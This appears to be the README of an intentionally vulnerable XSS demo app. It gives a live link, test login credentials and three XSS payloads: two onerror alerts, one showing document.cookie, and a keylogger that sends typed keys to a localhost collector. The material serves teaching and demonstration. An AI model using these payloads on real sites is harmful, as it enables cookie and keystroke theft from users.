### NOTE This app wont work locally because auth0 is not set for it
### NOTE If app freezes please disable dangerous mode and refresh page, it has to do with something with Render.com

### Link to live app [dangerzone](https://dangerzonexss.onrender.com/)

### Credentials for testing

1. Username/email
```
adminko.admin@gmail.com
```

2. Password
```
strongAdminPassword123
```

### Some xss scripts for testing in dangerous mode:
BTW, it is recommended to write malicious text inside textarea when in safe mode because
entered text is displayed right under the text area (text change forces update in lower html element, in this case )

1. 
```html
\<img src onerror="alert('XSS attack')"/>
```

2. 
```html
\<img src onerror="alert(document.cookie)" />
```

3.
```html
<img src="does-not-exist" onerror="var timeout; var buffer = \'\'; document.querySelector(\'body\').addEventListener(\'keypress\', function(event) { if (event.which !== 0) { clearTimeout(timeout); buffer += String.fromCharCode(event.which); timeout = setTimeout(function() { var xhr = new XMLHttpRequest(); var uri = \'http://localhost:3001/keys?data=\' + encodeURIComponent(buffer); xhr.open(\'GET\', uri); xhr.send(); buffer = \'\'; }, 400); } });">
```

### Advice 
